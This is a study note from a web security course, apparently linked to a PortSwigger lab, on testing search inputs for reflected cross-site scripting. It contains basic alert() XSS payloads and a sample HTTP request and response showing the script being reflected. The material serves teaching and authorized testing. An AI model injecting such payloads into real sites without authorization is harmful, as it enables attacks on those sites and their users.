---
course: Web Security
topic: Cross-Site Scripting (XSS)
tags: [web-security]
---

## Testing for Classic XSS Vulnerabilities

Once you have identified a reflected input, the next step is to test for classic XSS vulnerabilities. This involves injecting simple JavaScript payloads to see if they are executed.

### Example Payloads

1. **Basic Script Tag**:
   ```html
   <script>alert('XSS')</script>
   ```

2. **Event Handlers**:
   ```html
   <img src="x" onerror="alert('XSS')">
   ```

#### Testing the Payloads

1. **Inject the Payload**: Replace the search term with the payload and submit the form.
2. **Observe the Response**: Check if the payload is executed in the browser.

```http
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

query=<script>alert('XSS')</script>
```

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <h1>Search Results for "<script>alert('XSS')</script>"</h1>
</body>
</html>
```

### Custom Error Messages

If the payload is blocked, the application might return a custom error message indicating that certain tags are not allowed.

```http
HTTP/1.1 400 Bad Request
Content-Type: text/plain

This tag is not allowed.
```

---
<!-- nav -->
[[16-Real-World Examples and Recent Breaches|Real-World Examples and Recent Breaches]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/19-Lab 18 Reflected XSS into HTML context with all tags blocked except custom ones/00-Overview|Overview]] | [[18-Understanding Custom Tags in XSS|Understanding Custom Tags in XSS]]
